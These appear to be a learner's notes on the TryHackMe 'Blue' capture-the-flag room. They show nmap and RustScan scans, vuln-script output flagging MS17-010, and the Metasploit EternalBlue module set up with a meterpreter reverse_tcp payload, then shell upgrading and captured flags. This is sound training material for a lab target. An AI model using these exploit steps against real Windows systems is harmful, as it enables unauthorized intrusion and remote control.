Machine IP: 10.112.187.5

Scan

```bash
gerald@kali:~/Notes/THM/tryhackme/Blue $ sudo nmap -Pn --min-rate 1000 -T4 -p- 10.112.187.5 
[sudo] password for gerald: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 04:01 -0400
Nmap scan report for 10.112.187.5 (10.112.187.5)
Host is up (0.17s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49160/tcp open  unknown
49165/tcp open  unknown

```

RustScan

```bash
rustscan -a 10.112.187.5 
```

--p can also be used to specify the ports,
--r can also be used for port range

Integrating it with Nmap

```bash
rustscan -a 10.112.187.5 -- -sV -sC
```

Optimizing the speed:

Batch size (-b): controls how many ports are scanned simultaneously. The default is around 3000-4500. Increasing this (e.g 5000) makes the scan faster but can trigger firewalls or saturate the network.

Timeout (-t): the time in miliseconds that Rustscan waits for a response. The default is often 1.5 seconds. On slower or high latency networks, increase it to around 3000 to ensure you don't miss open ports.

Ulimit (--ulimit): Rustscan opens many files/sockets at once. If you get errors, use the --ulimit 5000 to increase your system limit.


#### Finding the Vulnerabilities

Nmap is itself just a port scanner and not a full-blow vulnerability scanner like Nessus or OpenVas. However, the nmap scripting engine can be used to check for specific vulnerabilities.

1. The vuln Category

To run all scripts in the Nmap's database that check for known vulnerabilities, use:

```bash
nmap --script vuln <targe>
```

This checks for common high-impact flaws like MS17-010, heartbleed and various web vulnerabilities.

this can be noisy though and sometime intrusive as it actively probes the services.

### Specific vulnerability Scripts

Wildcards come in handy in this:

```bash
nmap --script "smb-vuln-*" <target>
```


### Most Modern way

The vulners script compares service versions found by Nmap against a massive online database of CVEs.

```bash
nmap -sV --script vulners <target>
```

-sV is required so nmap knows which software versions to lookup.

This can also be integrated with rust

```bash
rustscan -a <target> -- -sV -script vulners
```

### Used the vuln script

```bash
nmap  -Pn  --script vuln 10.112.187.5
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 04:22 -0400
Nmap scan report for 10.112.187.5 (10.112.187.5)
Host is up (0.23s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49160/tcp open  unknown
49165/tcp open  unknown

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 205.76 seconds

```


#### Specific Exploit

```bash
msf > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

msf > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target ma
                                             chines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machin
                                             es.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.122    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) > 

```

### Running The Exploit
![[Pasted image 20260327045640.png]]


To upgrade the shell, there are two ways,

background the current shell,
Lists the available sessions
then run:

```bash
sessions -u <session_id>
```

## OR

Use the post module 

```bash
use post/multi/manage/shell_to_meterpreter
```

![[Pasted image 20260327073252.png]]


flag{sam_database_elevated_access} - Flag2



![[Pasted image 20260327080827.png]]



![[Pasted image 20260327081826.png]]


flag{access_the_machine}